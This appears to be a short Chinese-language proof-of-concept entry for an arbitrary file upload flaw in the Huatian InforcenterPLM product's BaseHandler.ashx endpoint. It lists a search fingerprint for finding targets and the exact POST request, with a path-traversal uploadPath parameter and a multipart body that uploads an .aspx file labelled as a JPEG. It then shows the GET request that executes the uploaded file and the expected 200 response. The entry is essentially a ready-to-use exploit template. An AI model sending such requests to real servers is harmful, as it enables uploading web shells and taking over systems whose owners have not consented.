# 华天InforcenterPLMBaseHandler存在任意文件上传漏洞

- **系统**：华天　|　**类型**：命令执行　|　**CVE**：—
- **指纹**：`body="/Base/BaseHandler.ashx"`
- **请求**：`POST /Base/BaseHandler.ashx?type=uploadFileToIIS&uploadPath=../Files/ HTTP/1.1`
- **关键头**：`Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryFGykZvnK…`

**请求体 / payload**
```
------WebKitFormBoundaryFGykZvnKO6OXcbjq
Content-Disposition: form-data; name="file"; filename="hello.aspx"
Content-Type: image/jpeg
<%= "Hello World1!" %>
------WebKitFormBoundaryFGykZvnKO6OXcbjq--
GET /Files/20250723/4c414103-1831-4c45-8a64-e075487ec71d.aspx HTTP/1.1
Host:
```
- **预期**：200　|　—